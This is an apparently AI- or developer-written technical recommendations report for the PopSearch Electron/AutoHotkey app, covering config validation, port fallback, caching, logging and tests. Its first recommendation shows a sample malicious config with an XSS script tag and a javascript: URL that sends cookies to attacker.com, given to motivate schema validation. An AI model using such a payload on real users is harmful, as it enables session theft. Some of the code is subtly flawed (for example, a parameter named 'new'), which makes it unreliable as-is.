# PopSearch - Technical Recommendations

**Analysis Date:** 2025-02-15  
**Priority System:** Critical → High → Medium → Low  
**Effort Estimates:** Low (hours), Medium (days), High (weeks)

---

## Recommendation Summary

| Priority | Count | Total Effort |
|----------|-------|--------------|
| Critical | 3 | 2 Medium |
| High | 3 | 1 High, 2 Medium |
| Medium | 3 | 3 Low |
| Low | 3 | 2 Low, 1 Medium |
| **Total** | **12** | **~6 weeks** |

---

## Critical Priority

### 1. Implement JSON Schema Validation for Config Imports

**Issue:** No validation of imported configuration files allows XSS attacks

**Risk:**
```json
{
  "providers": [
    {
      "name": "<script>alert('XSS')</script>",
      "url": "javascript:void(document.location='http://attacker.com/steal?cookie='+document.cookie)"
    }
  ]
}
```

**Current Code:**
```javascript
// src/renderer/settings/bridge.js
const imported = JSON.parse(json);  // No validation
setProviders(imported.providers);   // Direct use
```

**Recommended Implementation:**
```javascript
import Ajv from 'ajv';

const schema = {
    type: 'object',
    required: ['providers'],
    properties: {
        providers: {
            type: 'array',
            items: {
                type: 'object',
                required: ['name', 'url', 'enabled'],
                properties: {
                    name: { 
                        type: 'string',
                        minLength: 1,
                        maxLength: 100,
                        pattern: '^[^<>]*$'  // No HTML tags
                    },
                    url: { 
                        type: 'string',
                        pattern: '^https?://'  // Only http/https
                    },
                    enabled: { type: 'boolean' },
                    category: { type: 'string', maxLength: 50 },
                    icon: { 
                        type: 'string',
                        pattern: '^(https?://|data:image/)'  // URL or data URI only
                    }
                }
            }
        },
        categories: {
            type: 'object',
            patternProperties: {
                '^[^<>]{1,50}$': { type: 'string' }
            }
        },
        appearance: {
            type: 'object',
            properties: {
                iconSize: { type: 'string', pattern: '^\\d+$' },
                fontColor: { type: 'string', pattern: '^#[0-9a-fA-F]{6}$' }
                // ... other appearance fields
            }
        }
    }
};

async function importConfig() {
    const json = await window.electronAPI.loadConfig();
    if (!json) return;
    
    const ajv = new Ajv();
    const validate = ajv.compile(schema);
    
    try {
        const imported = JSON.parse(json);
        
        if (!validate(imported)) {
            throw new Error(`Invalid config: ${ajv.errorsText(validate.errors)}`);
        }
        
        // Additional sanitization
        imported.providers.forEach(p => {
            p.name = sanitizeHTML(p.name);
            p.url = sanitizeURL(p.url);
        });
        
        setProviders(imported.providers);
        Store.saveProviders(imported.providers);
        showToast('Config imported successfully', 'success');
    } catch (err) {
        showToast(`Import failed: ${err.message}`, 'error');
    }
}

function sanitizeHTML(str) {
    return str.replace(/[<>]/g, '');
}

function sanitizeURL(url) {
    // Block javascript:, file:, data: (except data:image/)
    if (url.startsWith('javascript:') || url.startsWith('file:')) {
        throw new Error('Blocked dangerous URL protocol');
    }
    return url;
}
```

**Dependencies:**
```bash
npm install ajv --save
```

**Files to Modify:**
- `src/renderer/settings/bridge.js` - Add validation
- `package.json` - Add ajv dependency

**Testing:**
```javascript
// Test malicious imports
const malicious = {
    providers: [{
        name: '<script>alert("XSS")</script>',
        url: 'javascript:void(0)'
    }]
};
// Should reject with error
```

**Effort:** Medium (1 day)  
**Impact:** High (eliminates critical security vulnerability)

---

### 2. Implement Port Fallback and Error Notification

**Issue:** HTTP server silently fails if port 49152 is occupied

**Current Code:**
```javascript
// src/main/triggerServer.js
server.on('error', (e) => {
    if (e.code !== 'EADDRINUSE') {
        console.error('Server error:', e);
    }
    // EADDRINUSE silently ignored - no fallback, no user notification
});
```

**Recommended Implementation:**
```javascript
const PORTS = [49152, 49153, 49154, 49155, 49156];
let serverPort = null;

export function startServer() {
    tryPort(0);
}

function tryPort(index) {
    if (index >= PORTS.length) {
        // All ports failed
        showErrorNotification(
            'PopSearch Startup Error',
            'Could not start trigger server. Ports 49152-49156 are occupied. ' +
            'Hotkey trigger will not work. Please close other applications using these ports.'
        );
        logToFile('[Trigger Server] CRITICAL: All ports occupied');
        return;
    }
    
    const port = PORTS[index];
    const server = http.createServer(requestHandler);
    
    server.on('error', (e) => {
        if (e.code === 'EADDRINUSE') {
            logToFile(`[Trigger Server] Port ${port} in use, trying next...`);
            tryPort(index + 1);  // Try next port
        } else {
            console.error('Server error:', e);
        }
    });
    
    server.listen(port, '127.0.0.1', () => {
        serverPort = port;
        logToFile(`[Trigger Server] Listening on port ${port}`);
        
        // Write port to temp file for AHK script
        const portFile = path.join(app.getPath('temp'), 'popsearch_port.txt');
        fs.writeFileSync(portFile, port.toString());
        
        // Update AHK process with new port (if needed for dynamic port support)
    });
}

function showErrorNotification(title, message) {
    const { dialog } = require('electron');
    dialog.showErrorBox(title, message);
}
```

**AHK Script Update (for dynamic port):**
```ahk
; Read port from file
portFile := A_Temp . "\popsearch_port.txt"
if FileExist(portFile) {
    port := FileRead(portFile)
} else {
    port := "49152"  ; Default fallback
}

; Use dynamic port
whr.Open("GET", "http://127.0.0.1:" . port . "/search?q=" . encodedText, false)
```

**Files to Modify:**
- `src/main/triggerServer.js` - Add port fallback logic
- `.ahk/pop_search_trigger.ahk` - Read port from file
- Recompile AHK: `npm run build:ahk`

**Testing:**
```bash
# Occupy port 49152
python -m http.server 49152

# Start app - should bind to 49153 and show notification
```

**Effort:** Medium (1 day)  
**Impact:** High (prevents silent feature failure)

---

### 3. Add Selection Detection in AutoHotkey

**Issue:** Trigger fires even when no text is selected, overwrites clipboard unnecessarily

**Current Code:**
```ahk
TriggerPopup() {
    savedClipboard := ClipboardAll()
    A_Clipboard := ""
    Send("^c")  ; Always attempts copy
    ClipWait(0.3)
    selectedText := A_Clipboard  ; May be empty or stale
    ; ... send to Electron
}
```

**Recommended Implementation:**
```ahk
TriggerPopup() {
    ; Check if text is selected before triggering
    if (!HasTextSelection()) {
        return  ; Do nothing if no selection
    }
    
    savedClipboard := ClipboardAll()
    A_Clipboard := ""
    Send("^c")
    
    ; Dynamic timeout
    if !ClipWait(0.1) {  ; Try 100ms first
        if !ClipWait(0.5) {  ; Extend to 600ms total
            ; Clipboard failed
            A_Clipboard := savedClipboard
            TrayTip("PopSearch", "Failed to copy text. Try selecting again.", 2)
            return
        }
    }
    
    selectedText := A_Clipboard
    
    ; Validate we got meaningful text
    if (StrLen(selectedText) == 0) {
        A_Clipboard := savedClipboard
        return  ; Don't trigger with empty query
    }
    
    encodedText := UriEncode(selectedText)
    
    try {
        whr := ComObject("WinHttp.WinHttpRequest.5.1")
        whr.Open("GET", "http://127.0.0.1:49152/search?q=" . encodedText, true)  ; Async
        whr.Send()
    } catch {
        ; Fallback
        exePath := A_ScriptDir . "\PopSearch.exe"
        if FileExist(exePath) {
            Run('"' . exePath . '" --search="' . StrReplace(selectedText, '"', "'") . '"')
        } else {
            TrayTip("PopSearch", "Failed to launch. Application not found.", 3, 0x10)
        }
    }
    
    A_Clipboard := savedClipboard
}

HasTextSelection() {
    ; Save current clipboard
    oldClip := ClipboardAll()
    
    ; Try to get selected text without modifying clipboard permanently
    A_Clipboard := ""
    Send("^c")
    if !ClipWait(0.05) {  ; Very short timeout
        A_Clipboard := oldClip
        return false
    }
    
    hasSelection := (StrLen(A_Clipboard) > 0)
    
    ; Restore clipboard immediately
    A_Clipboard := oldClip
    
    return hasSelection
}
```

**Files to Modify:**
- `.ahk/pop_search_trigger.ahk` - Add selection detection
- Recompile: `npm run build:ahk`

**Testing:**
```
1. Trigger without selection → Should do nothing
2. Select 1 character → Should trigger
3. Select 10,000 characters → Should trigger (test dynamic timeout)
4. Trigger in app with slow clipboard (VM, network drive) → Should extend timeout
```

**Effort:** Low (4 hours)  
**Impact:** High (eliminates clipboard interference, improves UX)

---

## High Priority

### 4. Implement Favicon Caching

**Issue:** Fetches 40+ favicons from Google API on every provider list render

**Current Code:**
```javascript
// src/renderer/settings/ui.js
function getFaviconUrl(searchUrl) {
    return `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
    // No caching - HTTP request on every render
}
```

**Recommended Implementation:**
```javascript
// In-memory cache
const faviconCache = new Map();

// LocalStorage persistent cache
const FAVICON_CACHE_KEY = 'favicon_cache';
const CACHE_EXPIRY_DAYS = 7;

function getCachedFaviconUrl(searchUrl) {
    const domain = new URL(searchUrl.replace(/{query}/g, '')).hostname;
    
    // Check in-memory cache first
    if (faviconCache.has(domain)) {
        return faviconCache.get(domain);
    }
    
    // Check LocalStorage cache
    const cache = getFaviconCacheFromStorage();
    if (cache[domain] && !isCacheExpired(cache[domain].timestamp)) {
        const url = cache[domain].url;
        faviconCache.set(domain, url);  // Populate in-memory cache
        return url;
    }
    
    // Fetch from API (not in cache or expired)
    const url = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
    
    // Preload image to populate browser cache
    const img = new Image();
    img.src = url;
    img.onload = () => {
        // Successfully loaded - cache it
        faviconCache.set(domain, url);
        saveFaviconToCache(domain, url);
    };
    
    return url;
}

function getFaviconCacheFromStorage() {
    try {
        return JSON.parse(localStorage.getItem(FAVICON_CACHE_KEY) || '{}');
    } catch {
        return {};
    }
}

function saveFaviconToCache(domain, url) {
    const cache = getFaviconCacheFromStorage();
    cache[domain] = {
        url: url,
        timestamp: Date.now()
    };
    
    // Limit cache size to prevent LocalStorage overflow
    const entries = Object.entries(cache);
    if (entries.length > 200) {
        // Remove oldest entries
        entries.sort((a, b) => a[1].timestamp - b[1].timestamp);
        const kept = Object.fromEntries(entries.slice(-200));
        localStorage.setItem(FAVICON_CACHE_KEY, JSON.stringify(kept));
    } else {
        localStorage.setItem(FAVICON_CACHE_KEY, JSON.stringify(cache));
    }
}

function isCacheExpired(timestamp) {
    const ageMs = Date.now() - timestamp;
    const maxAgeMs = CACHE_EXPIRY_DAYS * 24 * 60 * 60 * 1000;
    return ageMs > maxAgeMs;
}
```

**Cache Clearing (for settings UI):**
```javascript
// Add button to settings
export function clearFaviconCache() {
    localStorage.removeItem(FAVICON_CACHE_KEY);
    faviconCache.clear();
    renderProviders();  // Force re-fetch
    showToast('Icon cache cleared', 'info');
}
```

**Files to Modify:**
- `src/renderer/settings/ui.js` - Implement caching
- `src/renderer/popup/popup.js` - Use same cache (if needed)

**Testing:**
```javascript
// First render: 40 HTTP requests
renderProviders();

// Second render: 0 HTTP requests (all from cache)
renderProviders();

// After 7 days: Fresh fetches for expired entries
```

**Effort:** Low (4 hours)  
**Impact:** High (eliminates network latency, enables offline use)

---

### 5. Refactor Settings UI to Programmatic Event Listeners

**Issue:** 20+ functions exposed on `window.ui`, inline HTML onclick handlers

**Current Code:**
```javascript
// main.js
window.ui = {
    showSection, addProvider, editProvider, removeProvider,
    // ... 20 more functions
};

// index.html
<button onclick="window.ui.editProvider(0)">Edit</button>
```

**Recommended Implementation:**
```javascript
// ui.js - No global exposure
document.addEventListener('DOMContentLoaded', () => {
    attachEventListeners();
    initUI();
});

function attachEventListeners() {
    // Provider actions
    document.addEventListener('click', (e) => {
        const action = e.target.dataset.action;
        if (!action) return;
        
        const index = parseInt(e.target.dataset.index);
        
        const actions = {
            'edit-provider': () => editProvider(index),
            'remove-provider': () => removeProvider(index),
            'toggle-provider': () => toggleProvider(index),
            'add-provider': () => addProvider(),
            'save-appearance': () => saveAppearance(),
            // ... more actions
        };
        
        actions[action]?.();
    });
    
    // Form submissions
    document.getElementById('providerForm')?.addEventListener('submit', (e) => {
        e.preventDefault();
        addProvider();
    });
    
    // Input changes
    document.querySelectorAll('.appearance-input').forEach(input => {
        input.addEventListener('change', () => saveAppearance(true));
    });
}

// index.html - Data attributes instead of onclick
<button data-action="edit-provider" data-index="0">Edit</button>
<button data-action="remove-provider" data-index="0">Remove</button>
```

**Benefits:**
- CSP compatible (`script-src 'self'`)
- No global pollution
- Type-safe action dispatching
- Easier to unit test

**Files to Modify:**
- `src/renderer/settings/ui.js` - Implement event delegation
- `src/renderer/settings/main.js` - Remove window.ui exposure
- `src/renderer/settings/index.html` - Replace onclick with data-action

**Migration Strategy:**
```html
<!-- Before -->
<button onclick="window.ui.editProvider(${index})">

<!-- After -->
<button data-action="edit-provider" data-index="${index}">
```

**Effort:** High (3-4 days for full refactor)  
**Impact:** Medium (improves code quality, security, testability)

---

### 6. Implement Selective DOM Updates

**Issue:** Full provider list destruction/rebuild on every state change

**Current Code:**
```javascript
export function renderProviders() {
    container.innerHTML = '';  // Destroy all
    filteredProviders.forEach(p => {
        const div = createProviderElement(p, index);
        container.appendChild(div);  // Rebuild all
    });
}
```

**Recommended Implementation:**
```javascript
// Track current render state
let renderedProviders = [];

export function renderProviders() {
    const filtered = getFilteredData().filteredProviders;
    
    // Detect changes
    const changes = detectChanges(renderedProviders, filtered);
    
    if (changes.fullRebuild) {
        // Only on major structural changes (search filter, category switch)
        fullRender(filtered);
    } else {
        // Selective updates
        changes.removed.forEach(index => removeProviderElement(index));
        changes.added.forEach(p => addProviderElement(p));
        changes.updated.forEach(p => updateProviderElement(p));
    }
    
    renderedProviders = filtered.slice();  // Update tracking
}

function detectChanges(old, new) {
    // Full rebuild needed if:
    if (searchQuery || old.length !== new.length) {
        return { fullRebuild: true };
    }
    
    // Selective updates
    const removed = [];
    const added = [];
    const updated = [];
    
    new.forEach((p, i) => {
        if (!old[i] || old[i].name !== p.name) {
            updated.push({ provider: p, index: i });
        }
    });
    
    return { fullRebuild: false, removed, added, updated };
}

function updateProviderElement(provider, index) {
    const existingDiv = container.children[index];
    const newDiv = createProviderElement(provider, index);
    existingDiv.replaceWith(newDiv);  // Replace only changed element
}
```

**Alternative: Virtual DOM Library**
```bash
npm install snabbdom --save
```

```javascript
import { init, h } from 'snabbdom';

const patch = init([
    require('snabbdom/modules/class').default,
    require('snabbdom/modules/props').default,
    require('snabbdom/modules/eventlisteners').default
]);

let vnode = null;

function render() {
    const newVnode = h('div#providers', 
        filteredProviders.map(p => createProviderVNode(p))
    );
    
    vnode = patch(vnode || container, newVnode);
}
```

**Effort:** Medium (2-3 days for selective updates, or 3 days for virtual DOM)  
**Impact:** High (improves performance, preserves UI state)

---

## Medium Priority

### 7. Standardize Logging Format

**Issue:** Inconsistent log messages, difficult to parse programmatically

**Current Code:**
```javascript
logToFile(`[AHK Manager] Process started`);
logToFile(`App starting...`);
logToFile(`CRITICAL: Icon missing`);
```

**Recommended Implementation:**
```javascript
// src/main/logger.js
const LOG_LEVELS = {
    DEBUG: 0,
    INFO: 1,
    WARN: 2,
    ERROR: 3
};

let currentLevel = LOG_LEVELS.INFO;  // Configurable via env var

export const logger = {
    debug: (component, message, data = {}) => 
        logMessage('DEBUG', component, message, data),
    
    info: (component, message, data = {}) => 
        logMessage('INFO', component, message, data),
    
    warn: (component, message, data = {}) => 
        logMessage('WARN', component, message, data),
    
    error: (component, message, error = null) => {
        const data = error ? { error: error.stack || error.message } : {};
        logMessage('ERROR', component, message, data);
    }
};

function logMessage(level, component, message, data) {
    if (LOG_LEVELS[level] < currentLevel) return;
    
    const timestamp = new Date().toISOString();
    const dataStr = Object.keys(data).length ? ` ${JSON.stringify(data)}` : '';
    const formatted = `${timestamp} [${level}] [${component}] ${message}${dataStr}`;
    
    console.log(formatted);
    log.info(formatted);
}

// Backward compatibility
export function logToFile(message) {
    logger.info('Legacy', message);
}
```

**Usage:**
```javascript
// Replace old logging
logToFile(`[AHK Manager] Process started`);

// With new structured logging
logger.info('AHK Manager', 'Process started', { pid: ahkProcess.pid });
logger.error('Window Manager', 'Failed to create popup', error);
logger.debug('Trigger Server', 'Request received', { query, ip: req.ip });
```

**Effort:** Low (4 hours to implement, 1 day to migrate all calls)  
**Impact:** Medium (improves debugging, enables log analysis)

---

### 8. Extract Hardcoded Configuration

**Issue:** Ports, timeouts, paths hardcoded throughout codebase

**Current Code:**
```javascript
server.listen(49152, '127.0.0.1');  // Hardcoded
ClipWait(0.3)  // Hardcoded 300ms
popupWindow = new BrowserWindow({ width: 400, height: 60 });  // Hardcoded
```

**Recommended Implementation:**
```javascript
// src/shared/config.js
export const CONFIG = {
    server: {
        ports: [49152, 49153, 49154, 49155, 49156],
        host: '127.0.0.1'
    },
    
    ahk: {
        clipboardTimeoutMs: 300,
        mouseHoldThresholdMs: 200
    },
    
    popup: {
        defaultWidth: 400,
        defaultHeight: 60,
        cursorOffsetY: 20
    },
    
    logger: {
        level: process.env.LOG_LEVEL || 'info',
        maxFileSizeMB: 5,
        fileName: 'debug_log.txt'
    },
    
    paths: {
        ahkScript: 'assets/pop_search_trigger.exe',
        icon: 'assets/icon.png',
        configFile: 'pop_search_config.json'
    }
};

// Usage
import { CONFIG } from './shared/config';

server.listen(CONFIG.server.ports[0], CONFIG.server.host);
popupWindow = new BrowserWindow({ 
    width: CONFIG.popup.defaultWidth,
    height: CONFIG.popup.defaultHeight 
});
```

**Environment Variable Support:**
```javascript
// Override via environment
const port = process.env.POPSEARCH_PORT || CONFIG.server.ports[0];
```

**Effort:** Low (2 hours)  
**Impact:** Medium (improves flexibility, easier deployment customization)

---

### 9. Add Date-Based Log Rotation

**Issue:** Single log file with only size-based rotation

**Current Code:**
```javascript
log.transports.file.maxSize = 5 * 1024 * 1024;  // 5MB only
log.transports.file.fileName = 'debug_log.txt';
```

**Recommended Implementation:**
```javascript
// src/main/logger.js
const today = new Date().toISOString().split('T')[0];  // YYYY-MM-DD
log.transports.file.fileName = `debug_log_${today}.txt`;

// Cleanup old logs (keep last 30 days)
function cleanupOldLogs() {
    const logsDir = path.dirname(log.transports.file.getFile().path);
    const files = fs.readdirSync(logsDir);
    
    const cutoffDate = new Date();
    cutoffDate.setDate(cutoffDate.getDate() - 30);
    
    files.forEach(file => {
        if (!file.startsWith('debug_log_')) return;
        
        const match = file.match(/debug_log_(\d{4}-\d{2}-\d{2})\.txt/);
        if (!match) return;
        
        const fileDate = new Date(match[1]);
        if (fileDate < cutoffDate) {
            fs.unlinkSync(path.join(logsDir, file));
            console.log(`Deleted old log: ${file}`);
        }
    });
}

// Run cleanup on app start
app.whenReady().then(() => {
    cleanupOldLogs();
    // ... rest of initialization
});
```

**Effort:** Low (2 hours)  
**Impact:** Low (easier log analysis, automatic cleanup)

---

## Low Priority

### 10. Implement Keyboard Navigation for Popup

**Issue:** Popup requires mouse interaction

**Recommended Implementation:**
```javascript
// src/renderer/popup/popup.js
let selectedProviderIndex = 0;

document.addEventListener('keydown', (e) => {
    const filtered = getFilteredData().filteredProviders;
    const currentCategory = filtered.filter(p => 
        (p.category || 'Unsorted') === currentCategory
    );
    
    switch(e.key) {
        case 'ArrowRight':
            selectedProviderIndex = (selectedProviderIndex + 1) % currentCategory.length;
            highlightProvider(selectedProviderIndex);
            break;
            
        case 'ArrowLeft':
            selectedProviderIndex = (selectedProviderIndex - 1 + currentCategory.length) % currentCategory.length;
            highlightProvider(selectedProviderIndex);
            break;
            
        case 'Enter':
            const provider = currentCategory[selectedProviderIndex];
            window.electronAPI.search(provider.url, currentQuery);
            break;
            
        case 'Escape':
            window.close();
            break;
            
        case 'Tab':
            e.preventDefault();
            switchCategory(e.shiftKey ? -1 : 1);  // Shift+Tab = previous category
            break;
    }
});

function highlightProvider(index) {
    document.querySelectorAll('.provider-icon-wrapper').forEach((el, i) => {
        el.classList.toggle('keyboard-selected', i === index);
    });
}
```

**CSS:**
```css
.provider-icon-wrapper.keyboard-selected {
    outline: 2px solid var(--accent-color);
    outline-offset: 2px;
}
```

**Effort:** Medium (1 day)  
**Impact:** Low (improves power user experience, accessibility)

---

### 11. Add Dynamic Tray Menu

**Issue:** Tray menu static after creation, never reflects current state

**Recommended Implementation:**
```javascript
// src/main/trayManager.js
export function updateTrayMenu() {
    if (!tray) return;
    
    const providers = getProviders();  // Read from config
    const enabledCount = providers.filter(p => p.enabled).length;
    
    const contextMenu = Menu.buildFromTemplate([
        {
            label: `Settings (${enabledCount} providers)`,
            click: () => {
                const mainWindow = getMainWindow();
                if (mainWindow) {
                    mainWindow.show();
                    mainWindow.focus();
                }
            }
        },
        { type: 'separator' },
        {
            label: 'Recent Searches',
            submenu: getRecentSearchesMenu()  // Top 5 recent queries
        },
        { type: 'separator' },
        {
            label: 'Reload',
            click: () => reloadAllWindows()
        },
        {
            label: 'Quit',
            click: () => app.quit()
        }
    ]);
    
    tray.setContextMenu(contextMenu);
}

// Call after provider changes
ipcMain.on('providers-updated', () => {
    updateTrayMenu();
});
```

**Effort:** Low (2 hours)  
**Impact:** Low (minor UX improvement)

---

### 12. Establish Unit Test Infrastructure

**Issue:** Zero test coverage

**Recommended Implementation:**
```bash
npm install --save-dev jest @testing-library/dom @testing-library/user-event
```

**jest.config.js:**
```javascript
module.exports = {
    testEnvironment: 'jsdom',
    moduleFileExtensions: ['js'],
    testMatch: ['**/__tests__/**/*.test.js'],
    collectCoverageFrom: [
        'src/**/*.js',
        '!src/**/*.test.js'
    ]
};
```

**Example Test (`src/renderer/settings/__tests__/store.test.js`):**
```javascript
import { Store } from '../store';

describe('Store', () => {
    beforeEach(() => {
        localStorage.clear();
    });
    
    test('getProviders returns defaults when empty', () => {
        const providers = Store.getProviders();
        expect(providers).toBeInstanceOf(Array);
        expect(providers.length).toBeGreaterThan(0);
    });
    
    test('saveProviders persists to localStorage', () => {
        const providers = [{ name: 'Test', url: 'http://test.com', enabled: true }];
        Store.saveProviders(providers);
        
        const retrieved = Store.getProviders();
        expect(retrieved).toEqual(providers);
    });
});
```

**package.json:**
```json
{
    "scripts": {
        "test": "jest",
        "test:watch": "jest --watch",
        "test:coverage": "jest --coverage"
    }
}
```

**Effort:** High (1 week initial setup + ongoing test writing)  
**Impact:** Medium (improves code confidence, prevents regressions)

---

## Implementation Roadmap

### Sprint 1 (Week 1-2): Critical Security & Reliability
- ✅ JSON schema validation (1 day)
- ✅ Port fallback + error notification (1 day)
- ✅ AHK selection detection (0.5 day)
- ✅ Favicon caching (0.5 day)

### Sprint 2 (Week 3-4): Performance & Code Quality
- ✅ Refactor event listeners (3 days)
- ✅ Selective DOM updates (2 days)

### Sprint 3 (Week 5-6): Infrastructure & Polish
- ✅ Standardized logging (1 day)
- ✅ Extract hardcoded config (0.5 day)
- ✅ Date-based log rotation (0.5 day)
- ✅ Keyboard navigation (1 day)
- ✅ Dynamic tray menu (0.5 day)
- ✅ Test infrastructure (2 days setup)

**Total Timeline:** ~6 weeks for all 12 recommendations

---

## Metrics for Success

**Before:**
- Config import: No validation (XSS vulnerable)
- Port conflict: Silent failure
- Favicon loading: 40 HTTP requests per render
- DOM updates: Full rebuild (200+ elements destroyed/created)
- Clipboard: 300ms interference window
- Tests: 0% coverage

**After:**
- Config import: Schema validated, XSS prevented
- Port conflict: Fallback ports 49152-49156 + user notification
- Favicon loading: 0 HTTP requests (all cached)
- DOM updates: Selective updates (1-5 elements changed)
- Clipboard: Selection detected before trigger (no interference)
- Tests: 40%+ coverage (core modules)

---

## Next Steps

See `troubleshooting-guide.md` for debugging strategies  
See `configuration-reference.md` for complete config documentation  
See `developer-onboarding-guide.md` for contribution workflow